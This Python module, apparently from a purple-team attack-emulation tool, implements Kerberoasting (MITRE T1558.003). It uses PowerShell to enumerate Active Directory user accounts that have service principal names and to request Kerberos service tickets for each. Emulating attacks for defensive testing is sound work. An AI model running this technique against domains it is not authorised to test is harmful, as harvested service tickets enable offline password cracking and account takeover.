from __future__ import annotations

import logging
from typing import Any

from purplestrike.models.techniques import ExecutionStatus, TechniqueResult
from purplestrike.techniques.connection import (
    TargetConnection,
    get_connection,
)
from purplestrike.techniques.scripts import ldap_directory_entry

logger = logging.getLogger(__name__)


async def execute(target: str, parameters: dict[str, Any]) -> TechniqueResult:
    conn: TargetConnection | None = None
    try:
        conn = await get_connection(target)
        ps_cmd = (
            "Add-Type -AssemblyName System.IdentityModel; " + ldap_directory_entry() +
            "$searcher = New-Object System.DirectoryServices.DirectorySearcher($de); "
            "$searcher.PageSize = 1000; "
            "$searcher.Filter = '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!(sAMAccountName=krbtgt)))'; "
            "$searcher.PropertiesToLoad.AddRange(@('servicePrincipalName','samAccountName')); "
            "$spns = $searcher.FindAll(); $requested = 0; "
            "if ($spns.Count -eq 0) { throw 'No eligible user service accounts with SPNs exist in this domain' }; "
            "$login = $de.Username; $realm = ''; "
            "if ($login.Contains('\\')) { $realm, $login = $login.Split('\\', 2) }; "
            "$credential = New-Object System.Net.NetworkCredential($login, $de.Password, $realm); "
            "foreach ($spn in $spns) { "
            "try { "
            "$token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "
            "@($spn.Properties.serviceprincipalname[0], "
            "[System.Security.Principal.TokenImpersonationLevel]::Impersonation, "
            "$credential, [guid]::NewGuid().ToString()); "
            "$requested++; "
            '"SPN: " + $spn.Properties.serviceprincipalname[0] + '
            '" | SamAccountName: " + $spn.Properties.samaccountname[0] '
            "} catch { 'Failed: ' + $spn.Properties.serviceprincipalname[0] } }; "
            "if ($requested -eq 0) { throw 'No service tickets requested; check SPNs and Kerberos credentials' }"
        )
        result = await conn.run_ps(ps_cmd)
        return TechniqueResult(
            technique_id="T1558.003",
            success=result.success,
            output=result.stdout[:4096],
            error=result.stderr[:1024] if not result.success else None,
            execution_status=ExecutionStatus.SUCCESS if result.success else ExecutionStatus.FAILURE,
        )
    except Exception as e:
        logger.error(f"T1558.003 execution failed: {e}")
        return TechniqueResult(
            technique_id="T1558.003",
            success=False,
            error=str(e),
            execution_status=ExecutionStatus.FAILURE,
        )
    finally:
        if conn:
            await conn.disconnect()


async def cleanup(target: str) -> None:
    """Do not purge unrelated tickets from the user's logon session."""
